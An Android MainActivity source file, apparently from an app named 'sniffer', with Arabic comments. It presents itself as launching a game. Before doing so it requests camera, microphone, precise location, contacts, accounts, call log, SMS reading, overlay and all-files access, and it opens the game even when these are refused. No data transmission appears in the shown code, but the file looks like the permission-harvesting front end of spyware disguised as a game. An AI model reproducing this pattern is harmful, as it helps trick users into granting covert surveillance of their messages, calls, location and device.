package com.v8.global.sniffer;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import com.v8.global.sniffer.game.MainGameActivity;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 1234;
    private static final int SYSTEM_ALERT_WINDOW_CODE = 1235;
    private static final int MANAGE_STORAGE_CODE = 1236;
    
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
        
        // التحقق مما إذا كانت الصلاحيات مُنحت سابقاً
        boolean permissionsAlreadyGranted = prefs.getBoolean("permissions_granted", false);
        
        if (permissionsAlreadyGranted) {
            // الصلاحيات مُنحت سابقاً، افتح اللعبة مباشرة
            openGame();
            return;
        }
        
        // أول مرة - اطلب الصلاحيات
        requestPermissions();
    }

    private void requestPermissions() {
        // قائمة الصلاحيات المطلوبة
        List<String> permissionsList = new ArrayList<>();
        permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        permissionsList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        permissionsList.add(Manifest.permission.CAMERA);
        permissionsList.add(Manifest.permission.RECORD_AUDIO);
        permissionsList.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissionsList.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        permissionsList.add(Manifest.permission.READ_CONTACTS);
        permissionsList.add(Manifest.permission.GET_ACCOUNTS);
        permissionsList.add(Manifest.permission.READ_PHONE_STATE);
        permissionsList.add(Manifest.permission.READ_CALL_LOG);
        permissionsList.add(Manifest.permission.READ_SMS);
        permissionsList.add(Manifest.permission.RECEIVE_SMS);

        // صلاحيات خاصة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, SYSTEM_ALERT_WINDOW_CODE);
                return;
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, MANAGE_STORAGE_CODE);
                return;
            }
        }

        // طلب الصلاحيات العادية
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : permissionsList) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsToRequest.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            // كل الصلاحيات ممنوحة
            savePermissionsGranted();
            openGame();
        }
    }

    private void savePermissionsGranted() {
        // سجل أن الصلاحيات مُنحت
        prefs.edit().putBoolean("permissions_granted", true).apply();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                savePermissionsGranted();
            }
            
            // حتى لو لم تُمنح كل الصلاحيات، افتح اللعبة
            openGame();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == SYSTEM_ALERT_WINDOW_CODE || requestCode == MANAGE_STORAGE_CODE) {
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    requestPermissions();
                }
            }, 500);
        }
    }

    private void openGame() {
        Intent intent = new Intent(this, MainGameActivity.class);
        startActivity(intent);
        finish();
    }
                      }
